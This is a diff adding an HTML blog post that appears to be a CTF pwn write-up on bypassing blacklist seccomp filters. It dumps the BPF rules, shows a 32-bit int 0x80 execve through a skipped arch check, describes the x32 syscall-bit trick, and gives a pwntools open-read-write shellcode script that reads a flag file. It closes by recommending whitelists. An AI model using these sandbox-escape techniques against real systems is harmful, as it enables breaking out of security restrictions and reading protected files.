@@ -1,0 +1,186 @@
+<!doctype html>
+<html lang="en" data-mode="dark" data-crt="on">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="theme-color" content="#060606" media="(prefers-color-scheme: dark)">
+<meta name="theme-color" content="#f3f3f3" media="(prefers-color-scheme: light)">
+<script>(function(){try{var d=document.documentElement,m=localStorage.getItem('sf.mode');if(!m)m=matchMedia('(prefers-color-scheme: light)').matches?'light':'dark';d.setAttribute('data-mode',m);if(localStorage.getItem('sf.crt')==='on')d.setAttribute('data-crt','on');}catch(e){}})();</script>
+<title>seccomp jails, and the holes in them — algoatson.github.io</title>
+<meta name="description" content="A seccomp filter that kills execve but forgets the arch check, the x32 bit, or openat is a jail with the bars painted on. Read the filter, find the gap, and turn a blacklist into open-read-write.">
+<meta name="author" content="your name here">
+<link rel="canonical" href="https://algoatson.github.io/p/seccomp-jails-and-their-holes/">
+<meta property="og:type" content="article">
+<meta property="og:title" content="seccomp jails, and the holes in them — algoatson.github.io">
+<meta property="og:description" content="A seccomp filter that kills execve but forgets the arch check, the x32 bit, or openat is a jail with the bars painted on. Read the filter, find the gap, and turn a blacklist into open-read-write.">
+<meta property="og:url" content="https://algoatson.github.io/p/seccomp-jails-and-their-holes/">
+<meta property="og:site_name" content="algoatson.github.io">
+<meta property="og:image" content="https://algoatson.github.io/assets/og/seccomp-jails-and-their-holes.png"><meta name="twitter:card" content="summary_large_image">
+<link rel="preload" href="/assets/vga.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="icon" type="image/svg+xml" href="/assets/favicon.svg">
+<link rel="alternate" type="application/rss+xml" title="algoatson.github.io" href="/feed.xml">
+<link rel="stylesheet" href="/assets/style.css">
+<link rel="stylesheet" href="/assets/pygments.css">
+<script type="application/ld+json">{"@context": "https://schema.org", "@type": "Article", "headline": "seccomp jails, and the holes in them", "datePublished": "2026-04-30", "dateModified": "2026-04-30", "author": {"@type": "Person", "name": "your name here"}, "publisher": {"@type": "Person", "name": "segfault"}, "description": "A seccomp filter that kills execve but forgets the arch check, the x32 bit, or openat is a jail with the bars painted on. Read the filter, find the gap, and turn a blacklist into open-read-write.", "url": "https://algoatson.github.io/p/seccomp-jails-and-their-holes/", "mainEntityOfPage": "https://algoatson.github.io/p/seccomp-jails-and-their-holes/", "keywords": "pwn, seccomp, ctf"}</script></head>
+<body>
+<a class="skip" href="#main">skip to content</a>
+<div class="progress" aria-hidden="true"></div>
+<div class="wrap">
+  <div class="frame">
+    <span class="frame__legend"><a href="/">algoatson.github.io</a></span>
+    <span class="frame__addr">~/posts</span>
+
+    <header class="bar">
+      <span class="bar__prompt">&#10095; <b>segfault</b>@algoatson.github.io</span>
+      <nav class="nav" aria-label="primary"><a href="/about/">whoami</a><a href="/" aria-current="page">posts</a><a href="/series/">series</a><a href="/tags/">tags</a></nav>
+      <button class="searchbtn" data-open="search" type="button">grep<kbd>/</kbd></button>
+    </header>
+
+    <main class="main" id="main">
+<a class="backlink" href="/">back to index</a>
+<header class="posthead">
+  <h1>seccomp jails, and the holes in them</h1>
+  <div class="meta"><span>2026-04-30</span><span>3 min read</span><a class="tag" href="/tags/pwn/">pwn</a> <a class="tag" href="/tags/seccomp/">seccomp</a> <a class="tag" href="/tags/ctf/">ctf</a></div>
+</header>
+
+<div class="postwrap has-toc">
+  <aside class="toc" aria-label="table of contents"><span class="toctitle">contents</span><div class="toc">
+<ul>
+<li><a href="#read-the-filter-first">read the filter first</a></li>
+<li><a href="#hole-1-the-arch-check-it-skipped">hole 1 — the arch check it skipped</a></li>
+<li><a href="#hole-2-when-execve-really-is-gone-orw">hole 2 — when execve really is gone: ORW</a></li>
+</ul>
+</div>
+</aside>
+  <article class="prose"><p>You land code execution, reach for <code class="highlight">execve(&quot;/bin/sh&quot;)</code>, and the process dies with
+<code class="highlight">Bad system call</code> (SIGSYS). A seccomp-bpf filter is in the way. The good news:
+most filters are <strong>blacklists</strong>, and a blacklist is only as good as its author's
+memory. Read it, find what they forgot, and walk through.</p>
+<figure class="target"><figcaption><span class="t-label">target</span><span class="t-file">./jail</span></figcaption><div class="target__grid target__grid--solo"><dl class="target__facts"><div><dt>arch</dt><dd>amd64-64-little</dd></div><div><dt>seccomp</dt><dd>blacklist (execve killed)</dd></div><div><dt>goal</dt><dd>read ./flag despite the filter</dd></div></dl></div></figure>
+<h2 id="read-the-filter-first">read the filter first<a class="headerlink" href="#read-the-filter-first" title="Permanent link">#</a></h2>
+<p>Never guess at the rules — dump them. <code class="highlight">seccomp-tools</code> runs the binary and prints
+the BPF program as readable logic:</p>
+<figure class="codeblock"><figcaption><span class="fname">seccomp-tools dump ./jail</span><span class="lang">txt</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#seccomp-tools-dump-jail-1">1</a></span>
+<span class="normal"><a href="#seccomp-tools-dump-jail-2">2</a></span>
+<span class="normal"><a href="#seccomp-tools-dump-jail-3">3</a></span>
+<span class="normal"><a href="#seccomp-tools-dump-jail-4">4</a></span>
+<span class="normal"><a href="#seccomp-tools-dump-jail-5">5</a></span>
+<span class="normal"><a href="#seccomp-tools-dump-jail-6">6</a></span>
+<span class="normal"><a href="#seccomp-tools-dump-jail-7">7</a></span>
+<span class="normal"><a href="#seccomp-tools-dump-jail-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="seccomp-tools-dump-jail-1"> line  CODE  JT   JF      K
+</span><span id="seccomp-tools-dump-jail-2">=================================
+</span><span id="seccomp-tools-dump-jail-3"><span class="hll"> 0000: ld    [4]                  ; A = arch
+</span></span><span id="seccomp-tools-dump-jail-4"> 0001: jeq   0xc000003e  0002 0005 ; AUDIT_ARCH_X86_64 ? next : ALLOW
+</span><span id="seccomp-tools-dump-jail-5"> 0002: ld    [0]                  ; A = nr
+</span><span id="seccomp-tools-dump-jail-6"><span class="hll"> 0003: jeq   0x3b       0004 0005 ; nr == 59 (execve) ? KILL : ALLOW
+</span></span><span id="seccomp-tools-dump-jail-7"> 0004: ret   KILL
+</span><span id="seccomp-tools-dump-jail-8"> 0005: ret   ALLOW
+</span></code></pre></div></td></tr></table></div>
+</figure>
+<p>The filter operates on <code class="highlight">struct seccomp_data</code>: <code class="highlight">nr</code> at offset 0, <code class="highlight">arch</code> at offset
+4, then the six syscall args. Each rule is a comparison; the last one wins. Here:
+"if you're x86-64 <strong>and</strong> calling syscall 59, die; otherwise allow." That <code class="highlight">and</code>
+is the whole vulnerability.</p>
+<h2 id="hole-1-the-arch-check-it-skipped">hole 1 — the arch check it skipped<a class="headerlink" href="#hole-1-the-arch-check-it-skipped" title="Permanent link">#</a></h2>
+<p>Notice line <code class="highlight">0001</code>: if the arch is <strong>not</strong> <code class="highlight">AUDIT_ARCH_X86_64</code>, the filter jumps
+straight to <code class="highlight">ALLOW</code>. The CPU will happily run 32-bit syscalls via <code class="highlight">int 0x80</code>,
+where the <em>same numbers mean different calls</em> — and they arrive tagged
+<code class="highlight">AUDIT_ARCH_I386</code>, which this filter waves through:</p>
+<figure class="codeblock"><figcaption><span class="fname">same nr, different syscall</span><span class="lang">txt</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#same-nr-different-syscall-1">1</a></span>
+<span class="normal"><a href="#same-nr-different-syscall-2">2</a></span>
+<span class="normal"><a href="#same-nr-different-syscall-3">3</a></span>
+<span class="normal"><a href="#same-nr-different-syscall-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="same-nr-different-syscall-1">            x86-64 (syscall)     i386 (int 0x80)
+</span><span id="same-nr-different-syscall-2">  execve         59                    11
+</span><span id="same-nr-different-syscall-3">  read            0                     3
+</span><span id="same-nr-different-syscall-4">  write           1                     4
+</span></code></pre></div></td></tr></table></div>
+</figure>
+<p>So <code class="highlight">execve</code> is blocked at nr 59, but the i386 <code class="highlight">execve</code> is nr 11 <em>and</em> a different
+arch — both checks miss it. Switch to 32-bit and call it:</p>
+<figure class="codeblock"><figcaption><span class="fname">32-bit execve through the arch hole</span><span class="lang">asm</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#32-bit-execve-through-the-arch-hole-1">1</a></span>
+<span class="normal"><a href="#32-bit-execve-through-the-arch-hole-2">2</a></span>
+<span class="normal"><a href="#32-bit-execve-through-the-arch-hole-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="32-bit-execve-through-the-arch-hole-1"><span class="c1">; rax/eax = 11 (i386 execve), ebx=&amp;&quot;/bin/sh&quot;, ecx=0, edx=0</span>
+</span><span id="32-bit-execve-through-the-arch-hole-2"><span class="nf">mov</span><span class="w"> </span><span class="no">eax</span><span class="p">,</span><span class="w"> </span><span class="mi">11</span>
+</span><span id="32-bit-execve-through-the-arch-hole-3"><span class="nf">int</span><span class="w"> </span><span class="mi">0x80</span><span class="w">                  </span><span class="c1">; arch=I386 -&gt; filter allows -&gt; shell</span>
+</span></code></pre></div></td></tr></table></div>
+</figure>
+<div class="admonition warning">
+<p class="admonition-title">x32, the other arch trick</p>
+<p>Even when arch <em>is</em> pinned to x86-64, an exact <code class="highlight">nr == 59</code> match can be dodged
+with the <strong>x32 ABI</strong>: OR <code class="highlight">__X32_SYSCALL_BIT</code> (<code class="highlight">0x40000000</code>) into the number.
+<code class="highlight">0x4000003b</code> isn't <code class="highlight">0x3b</code>, so a <code class="highlight">jeq 0x3b</code> blacklist misses it while the kernel
+still dispatches it. Robust filters check <code class="highlight">nr &gt;= 0x40000000</code> and reject.</p>
+</div>
+<h2 id="hole-2-when-execve-really-is-gone-orw">hole 2 — when execve really is gone: ORW<a class="headerlink" href="#hole-2-when-execve-really-is-gone-orw" title="Permanent link">#</a></h2>
+<p>A tighter jail kills <code class="highlight">execve</code> <em>and</em> <code class="highlight">execveat</code> <em>and</em> pins the arch. Fine — you
+rarely need a shell, you need the flag. If <code class="highlight">open</code>/<code class="highlight">openat</code>, <code class="highlight">read</code>, and <code class="highlight">write</code>
+survive, just <strong>open-read-write</strong> it out:</p>
+<figure class="codeblock"><figcaption><span class="fname">orw.py — shellcraft does the syscalls</span><span class="lang">python</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#orwpy-shellcraft-does-the-syscalls-1">1</a></span>
+<span class="normal"><a href="#orwpy-shellcraft-does-the-syscalls-2">2</a></span>
+<span class="normal"><a href="#orwpy-shellcraft-does-the-syscalls-3">3</a></span>
+<span class="normal"><a href="#orwpy-shellcraft-does-the-syscalls-4">4</a></span>
+<span class="normal"><a href="#orwpy-shellcraft-does-the-syscalls-5">5</a></span>
+<span class="normal"><a href="#orwpy-shellcraft-does-the-syscalls-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="orwpy-shellcraft-does-the-syscalls-1"><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+</span><span id="orwpy-shellcraft-does-the-syscalls-2"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s2">&quot;amd64&quot;</span>
+</span><span id="orwpy-shellcraft-does-the-syscalls-3"><span class="n">sc</span>  <span class="o">=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">openat</span><span class="p">(</span><span class="o">-</span><span class="mi">100</span><span class="p">,</span> <span class="s2">&quot;./flag&quot;</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>   <span class="c1"># AT_FDCWD; openat (257) often unblocked</span>
+</span><span id="orwpy-shellcraft-does-the-syscalls-4"><span class="n">sc</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="s2">&quot;rax&quot;</span><span class="p">,</span> <span class="s2">&quot;rsp&quot;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span>   <span class="c1"># fd is returned in rax</span>
+</span><span id="orwpy-shellcraft-does-the-syscalls-5"><span class="n">sc</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s2">&quot;rsp&quot;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span>      <span class="c1"># spray it to stdout</span>
+</span><span id="orwpy-shellcraft-does-the-syscalls-6"><span class="n">run</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="n">sc</span><span class="p">))</span>
+</span></code></pre></div></td></tr></table></div>
+</figure>
+<p>The recurring blacklist gaps, in the order I check them:</p>
+<ul>
+<li><strong><code class="highlight">open</code> blocked, <code class="highlight">openat</code>/<code class="highlight">openat2</code> allowed</strong> — nr 2 vs 257/437. Almost always
+  the oversight; <code class="highlight">openat(AT_FDCWD, …)</code> is identical in effect.</li>
+<li><strong><code class="highlight">read</code>/<code class="highlight">write</code> blocked</strong> — fall back to <code class="highlight">pread64</code>, <code class="highlight">preadv</code>, <code class="highlight">readv</code>,
+  <code class="highlight">sendfile</code>, or <code class="highlight">splice</code>; or <code class="highlight">mmap</code> the file and copy it out.</li>
+<li><strong>arch not pinned</strong> — hole 1; switch to i386/int 0x80 numbering.</li>
+<li><strong><code class="highlight">ptrace</code> allowed</strong> — escape sideways into another process entirely.</li>
+</ul>
+<details class="spoiler">
+<summary>the flag</summary>
+<p><code class="highlight">openat</code> was never on the blacklist, so the jail that "blocks file access"
+reads its own flag out:
+<figure class="codeblock"><figcaption><span class="lang">txt</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#code-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="code-1">segfault{a_blacklist_is_a_todo_list_for_the_attacker}
+</span></code></pre></div></td></tr></table></div>
+</figure></p>
+</details>
+<p>The lesson is the same one the filter's author should have internalised:
+<strong>whitelist, don't blacklist.</strong> A blacklist is a list of syscalls you remembered
+to fear; the kernel offers hundreds, across multiple ABIs, several of which are
+synonyms. A whitelist that allows exactly <code class="highlight">{openat, read, write, exit_group}</code> and
+pins the architecture has no holes to find — which is precisely why you so rarely
+see one under time pressure.</p></article>
+</div>
+<section class="related"><span class="related__title">related</span><div class="listing"><div class="row"><span class="row__date">2026-05-26</span><a class="row__tag" href="/tags/pwn/">pwn</a><a class="row__title" href="/p/pwntools-cookbook/">a pwntools cookbook</a><span class="row__min">4 min</span></div><div class="row"><span class="row__date">2026-05-19</span><a class="row__tag" href="/tags/tooling/">tooling</a><a class="row__title" href="/p/checksec-everything/">one keybind to checksec everything</a><span class="row__min">3 min</span></div><div class="row"><span class="row__date">2026-02-22</span><a class="row__tag" href="/tags/pwn/">pwn</a><a class="row__title" href="/p/printf-is-a-write-primitive/">printf is a write primitive</a><span class="row__min">3 min</span></div></div></section>
+<nav class="pager"><a class="prev" href="/p/pwndbg-muscle-memory/"><span class="lbl">&#8249; newer</span>pwndbg muscle memory</a><a class="next" href="/p/first-five-minutes-unknown-binary/"><span class="lbl">older &#8250;</span>the first five minutes with an unknown binary</a></nav></main>
+
+    <footer class="status">
+      <span>32 posts</span>
+      <span class="shade">&#9617;&#9618;&#9619;</span>
+      <span>no trackers · no cookies · no js required to read · copying is encouraged</span>
+      <span class="right">
+        <a href="https://github.com/algoatson">github</a><a href="https://twitter.com/yourname">twitter</a><a href="mailto:you@segfault.sh">email</a>
+        <button class="toggle" data-toggle="mode" type="button">[light]</button>
+        <button class="toggle" data-toggle="crt" type="button">[crt]</button>
+        <a href="/feed.xml">[rss]</a>
+      </span>
+    </footer>
+  </div>
+</div>
+
+<div class="palette-mask" role="dialog" aria-modal="true" aria-label="search">
+  <div class="palette">
+    <div class="palette__count">grep<span class="n">0/0</span><span class="rule"></span>posts</div>
+    <div class="palette__input"><span class="sigil">&gt;</span><input type="text"
+       placeholder="fuzzy search title + body…" autocomplete="off" spellcheck="false" aria-label="search query"></div>
+    <div class="palette__results"></div>
+    <div class="palette__hint"><span><kbd>↑↓</kbd>/<kbd>^j ^k</kbd> move</span><span><kbd>⏎</kbd> open</span><span><kbd>esc</kbd> close</span></div>
+  </div>
+</div>
+<div class="help-mask" role="dialog" aria-modal="true" aria-label="keyboard shortcuts">
+  <div class="help"><h2>keys</h2><dl><dt><kbd>/</kbd></dt><dd>search</dd><dt><kbd>j / k</kbd></dt><dd>move / scroll</dd><dt><kbd>enter</kbd></dt><dd>open</dd><dt><kbd>g g / G</kbd></dt><dd>top / bottom</dd><dt><kbd>t</kbd></dt><dd>toggle light</dd><dt><kbd>?</kbd></dt><dd>this help</dd><dt><kbd>esc</kbd></dt><dd>close</dd></dl></div>
+</div>
+<script src="/assets/app.js" defer></script>
+</body>
+</html>
